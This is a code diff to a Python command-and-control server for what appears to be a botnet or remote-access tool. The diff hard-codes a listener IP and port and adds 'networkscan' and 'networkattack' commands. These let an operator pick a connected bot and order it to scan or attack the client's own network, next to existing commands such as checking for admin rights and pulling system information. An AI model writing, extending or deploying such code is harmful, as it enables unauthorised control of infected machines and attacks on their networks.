@@ -42,6 +42,7 @@ CYAN 	  = Fore.CYAN
 BLUE 	  = Fore.BLUE
 RED 	  = Fore.RED
 
+#region Unicode
 sdl 	  = "\u2551" 	# Vertical Line
 sal 	  = "\u2550" 	# Horizontal Line
 dll 	  = "\u2554"	# Down Left Corner
@@ -49,9 +50,11 @@ drl 	  = "\u255A"	# Down Right Corner
 dot	  	  = "\u2022"	# Dot
 #endregion
 
+#endregion
 
-IP 	 = "IP_HERE"
-PORT = int("PORT_HERE")
+
+IP   = "192.168.0.2"
+PORT = int("1888")
 
 
 class Server():
@@ -408,6 +411,8 @@ class Server():
                                                 {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                                 {sdl}      {RED}HELP MENU{self.COLOR_BORDER}      {sdl}
                           {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2569{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2569{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
+                          {sdl}    {self.COLOR_MAIN}networkattack    {self.COLOR_BORDER}{sdl}   {WHITE}Attack to attack the clients network   {self.COLOR_BORDER}{sdl}
+                          {sdl}    {self.COLOR_MAIN}networkscan      {self.COLOR_BORDER}{sdl}   {WHITE}Scan the clients network               {self.COLOR_BORDER}{sdl}
                           {sdl}    {self.COLOR_MAIN}admincheck       {self.COLOR_BORDER}{sdl}   {WHITE}Check if client is running as admin    {self.COLOR_BORDER}{sdl}
                           {sdl}    {self.COLOR_MAIN}setcolors        {self.COLOR_BORDER}{sdl}   {WHITE}Set GUI main and border colors         {self.COLOR_BORDER}{sdl}
                           {sdl}    {self.COLOR_MAIN}sysinfo          {self.COLOR_BORDER}{sdl}   {WHITE}Get system infomation                  {self.COLOR_BORDER}{sdl}
@@ -654,6 +659,117 @@ class Server():
 							try:
 								self.all_connections[i].send(cmd.encode())	
 								print(Fore.GREEN+f'\n\n{self.all_connections[i].recv(1024*5).decode("ascii")}')
+							except BrokenPipeError:
+								del self.all_address[i]
+								del self.all_connections[i]
+
+			elif cmd == "networkscan":
+				self.main_logo = f"""
+{self.COLOR_BORDER}
+
+                                              __     ______     ______    
+                                             /\ \   /\  ___\   /\  __ \   
+                                             \ \ \  \ \___  \  \ \ \/\ \  
+                                              \ \_\  \/\_____\  \ \_____\ 
+                                               \/_/   \/_____/   \/_____/ 
+
+                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
+                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
+                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
+                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D
+
+{RESET}                 
+"""
+				print(self.main_logo)
+				self.list_clients()
+				
+				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))
+
+				if bot > len(self.all_address) - 1:
+					print(RED + "\n\tInvalid Bot Number" + RESET)
+					sleep(2)
+					clear()
+					self.main_logo = f"""
+{self.COLOR_BORDER}
+
+                                              __     ______     ______    
+                                             /\ \   /\  ___\   /\  __ \   
+                                             \ \ \  \ \___  \  \ \ \/\ \  
+                                              \ \_\  \/\_____\  \ \_____\ 
+                                               \/_/   \/_____/   \/_____/ 
+
+                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
+                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
+                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
+                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D
+
+{RESET}                 
+"""
+					print(self.main_logo)
+					self._take_cmd()
+
+				else: 
+					for i, (ip, port) in enumerate(self.all_address): 
+						if i == bot:
+							try:
+								self.all_connections[i].send(cmd.encode())	
+								print(Fore.GREEN + f'\n\n{self.all_connections[i].recv(1024*5).decode("ascii")}')
+							except BrokenPipeError:
+								del self.all_address[i]
+								del self.all_connections[i]
+
+			elif cmd == "networkattack":
+				self.main_logo = f"""
+{self.COLOR_BORDER}
+
+                                              __     ______     ______    
+                                             /\ \   /\  ___\   /\  __ \   
+                                             \ \ \  \ \___  \  \ \ \/\ \  
+                                              \ \_\  \/\_____\  \ \_____\ 
+                                               \/_/   \/_____/   \/_____/ 
+
+                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
+                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
+                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
+                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D
+
+{RESET}                 
+"""
+				print(self.main_logo)
+				self.list_clients()
+				
+				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))
+
+				if bot > len(self.all_address) - 1:
+					print(RED + "\n\tInvalid Bot Number" + RESET)
+					sleep(2)
+					clear()
+					self.main_logo = f"""
+{self.COLOR_BORDER}
+
+                                              __     ______     ______    
+                                             /\ \   /\  ___\   /\  __ \   
+                                             \ \ \  \ \___  \  \ \ \/\ \  
+                                              \ \_\  \/\_____\  \ \_____\ 
+                                               \/_/   \/_____/   \/_____/ 
+
+                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
+                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
+                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
+                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D
+
+{RESET}                 
+"""
+					print(self.main_logo)
+					self._take_cmd()
+
+				else: 
+					print(f"\n\n\t{YELLOW}Starting Attack, please wait . . .{RESET}")
+					for i, (ip, port) in enumerate(self.all_address): 
+						if i == bot:
+							try:
+								self.all_connections[i].send(cmd.encode())	
+								print(Fore.RESET + f'\n\n\t{self.all_connections[i].recv(1024*5).decode("ascii")}\n')
 							except BrokenPipeError:
 								del self.all_address[i]
 								del self.all_connections[i]
